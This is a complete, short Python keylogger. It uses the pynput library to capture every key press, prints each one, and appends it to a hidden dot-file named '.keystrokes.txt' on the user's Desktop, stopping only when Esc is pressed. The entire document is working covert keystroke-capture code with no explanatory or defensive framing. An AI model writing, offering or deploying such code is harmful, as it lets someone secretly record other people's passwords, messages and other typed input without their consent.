from pynput import keyboard
import os

desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
hidden_file_path = os.path.join(desktop_path, '.keystrokes.txt')

def on_press(key):
    try:
        # Print the key that was pressed
        print(f'Key {key.char} pressed')

        # Save the key to the hidden text file
        with open(hidden_file_path, 'a') as file:
            file.write(key.char)

    except AttributeError:
        # Handle special keys
        print(f'Special key {key} pressed')

        # Save the special key to the hidden text file
        with open(hidden_file_path, 'a') as file:
            file.write(str(key))

def on_release(key):
    # Stop the listener if the 'esc' key is pressed
    if key == keyboard.Key.esc:
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
